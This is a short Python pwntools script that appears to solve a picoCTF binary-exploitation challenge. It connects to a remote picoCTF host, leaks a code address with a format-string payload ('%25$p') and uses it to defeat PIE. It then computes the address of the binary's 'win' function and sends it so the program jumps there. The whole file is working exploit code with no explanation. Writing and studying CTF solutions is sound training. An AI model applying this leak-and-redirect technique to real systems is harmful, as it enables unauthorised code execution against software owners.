from pwn import *

elf = context.binary = ELF("./vuln", checksec=False)

p = remote("rescued-float.picoctf.net", 65415)
p.recvuntil(b"name:")

b = b"%25$p"
p.sendline(b)
addrOfMain = int(p.recvline().decode().strip(), 16)
print(addrOfMain)

offset_main = 0x1400
base_addr = addrOfMain - offset_main
print(hex(base_addr))

win_addr = elf.sym['win']

win_func = base_addr + win_addr
print(hex(win_func))

p.recvuntil(b"45:")
p.sendline(hex(win_func))

resp = p.recvall()
print(resp.decode())


